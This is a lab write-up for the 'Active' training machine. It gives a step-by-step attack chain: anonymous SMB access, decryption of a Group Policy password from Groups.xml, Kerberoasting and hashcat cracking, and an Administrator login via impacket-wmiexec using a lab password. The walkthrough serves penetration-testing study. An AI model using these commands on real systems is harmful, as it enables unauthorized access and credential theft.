## Active

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.100 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/545f6c7b-617d-4c8b-b144-0926136778e3)

<br>

Since port 139 and 445 are open, we can enumerate SMB with some tools.

```
enum4linux 10.10.10.100

smbmap -H 10.10.10.100

smbclient -L //10.10.10.100
```

![enum4linux](https://github.com/b1d0ws/OSCP/assets/58514930/3203c23d-8be4-412b-bfd7-bc7de2f4d3a3)

<br>

We can connect to Replication with Null Session and download all files inside it.

```
smbclient -U '%' -N \\\\active.htb\\Replication

RECURSE on
PROMPT off
mget *
```

![smbclient](https://github.com/b1d0ws/OSCP/assets/58514930/657f8386-2339-4974-ada7-456d47ff0cf1)

![gettingFiles](https://github.com/b1d0ws/OSCP/assets/58514930/0e7a281a-6351-482e-bbbe-19de6a8f3fca)

<br>

One of the files is Groups.xml. This file contains credentials that we can decrypt.

```
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![groupsXML](https://github.com/b1d0ws/OSCP/assets/58514930/b0967634-8aa3-4d4b-99ee-e77ee37721f0)

![gppDecrypt](https://github.com/b1d0ws/OSCP/assets/58514930/58cd1d7d-ffa7-4a2b-bda2-73068744fd88)

<br>

We can connect to Users folder on SMB and get the user flag.

```
smbclient -U 'SVC_TGS' \\\\active.htb\\Users
```

### Root Flag

With the initial credentials, we can perform Kerberoasting attack.  

Use impacket-GetADUsers to enumerate users and impacket-GetUserSPNs to extract a TGS and crack it with hashcat.

```
impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100

impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request

hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

![getADUsers](https://github.com/b1d0ws/OSCP/assets/58514930/3d197473-ea7b-42c2-99ca-98d02156f7cf)

![getUserSPNs](https://github.com/b1d0ws/OSCP/assets/58514930/a1e74507-8377-409f-8ce2-406aab76a80f)

![hashcat](https://github.com/b1d0ws/OSCP/assets/58514930/2c067b13-04d5-405e-a654-83b5fe3796cd)

<br>

Now just login as Administrator with wmiexec. Psexec could also be used.

```
impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100
```

![administratorLogin](https://github.com/b1d0ws/OSCP/assets/58514930/6a350bd2-7ab1-41a3-ad65-3741aec3283f)
